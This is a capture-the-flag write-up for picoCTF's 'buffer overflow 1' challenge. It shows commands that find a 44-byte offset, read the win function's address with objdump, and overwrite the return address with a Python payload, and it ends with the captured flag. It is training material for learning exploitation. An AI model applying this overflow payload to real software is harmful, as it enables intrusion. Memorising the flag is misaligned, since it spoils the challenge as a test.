> buffer overflow 1 - Points: 200 - (Solves: 429)
> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709 on the shell server. Source.

We see that the buffer is of size 32.

We start at 32 and try to see when we hit the return address by gradually incrementing the number of input by 4 bytes each time.

At offset 44 we hit the start of the return value:
```
$ ./buf-of-2 < <(python -c "print 'A'*44 + 'B'*4")
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
Segmentation fault (core dumped)
```

This means that our offset is 44.

We get the address of the win function using `objdump`:
```
% objdump -d vuln | grep \<win\>
080485cb <win>:
```

We convert it to little endian format and add our offset to create our exploit.

```
% ./vuln < <(python -c "print 'A'*44 + '\xcb\x85\x04\x08'")
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asyd69e032d}Segmentation fault
```

Flag: `picoCTF{addr3ss3s_ar3_3asyd69e032d}`
